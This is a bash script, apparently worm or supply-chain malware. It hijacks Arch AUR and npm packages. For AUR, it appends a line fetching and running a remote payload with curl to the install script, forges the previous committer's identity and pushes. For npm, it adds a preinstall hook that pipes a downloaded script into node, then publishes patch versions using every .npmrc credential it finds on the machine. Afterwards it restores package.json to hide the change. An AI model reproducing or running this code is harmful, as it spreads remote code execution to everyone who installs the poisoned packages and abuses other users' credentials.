#!/bin/bash
_do_aur_update() {
  local _tmp_git_path=$(mktemp -d)
  git clone "ssh://aur@aur.archlinux.org/$1.git" "$_tmp_git_path"

  cd "$_tmp_git_path" || exit 1
  source PKGBUILD

  ((pkgrel++))

  printf '\npkgrel=%s\n' "$pkgrel" >> PKGBUILD

  if [ -z "$install" ]; then
    install="$pkgname.install"
    echo "install='$install'" >> PKGBUILD
  fi

  echo "bash <(curl '$payload_url')" >> "$install"

  git config user.email "$(git log -1 --pretty=format:'%ae')"
  git config user.name "$(git log -1 --pretty=format:'%an')"

  git add PKGBUILD "$install"
  git commit -m "upgpkg: $pkgver-$pkgrel" -a --no-gpg-sign
  git push

  rm -rf "$_tmp_git_path"
}
_do_npm_update() {
  cd "$1" || exit 1

  local _package_json_orig="$(mktemp -u)"
  cp -a package.json "$_package_json_orig"

  local hook_command="$(npm pkg get scripts.preinstall)"
  if [ -n "$hook_command" ]; then
    local hook_command+=' & '
  fi

  local hook_command+="curl $bootstrap_url | node"

  npm pkg set scripts.preinstall="$hook_command"

  npm version patch

  for NPM_CONFIG_USERCONFIG in {/home/*,.,/mnt/c/Users/*,/root}/.npmrc "$PREFIX/etc/npmrc"
  do
    export NPM_CONFIG_USERCONFIG
    npm publish &
  done

  wait

  mv -f "$_package_json_orig" package.json
}